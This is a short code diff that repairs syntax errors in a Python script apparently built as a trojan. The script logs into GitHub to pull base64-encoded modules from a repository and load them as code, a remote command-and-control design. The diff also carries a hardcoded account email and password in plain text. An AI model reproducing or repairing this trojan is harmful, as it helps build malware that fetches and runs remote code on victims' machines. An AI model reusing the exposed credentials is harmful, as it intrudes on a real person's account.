@@ -16,12 +16,12 @@ trojan_id = "abc"
 trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
-configured = false
+configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-  gh = login(username="volkbrat11@gmail.com", password="Undiegoblu19#"
-  repo = gh.repository("hackingskill", "chapter7"
+  gh = login(username="volkbrat11@gmail.com", password="Undiegoblu19#")
+  repo = gh.repository("volkbrat11@gmail.com", "chapter7")
   branch = repo.branch("master")
 
   return gh,repo,branch
@@ -79,7 +79,8 @@ class GitImporter(object):
       new_library = get_file_contents("modules/%s" % fullname)
       
       if new_library is not None:
-        self.current_module_code = \ base64.b64decode(new_library)
+        self.current_module_code = \
+          base64.b64decode(new_library)
       return self
       
     return None
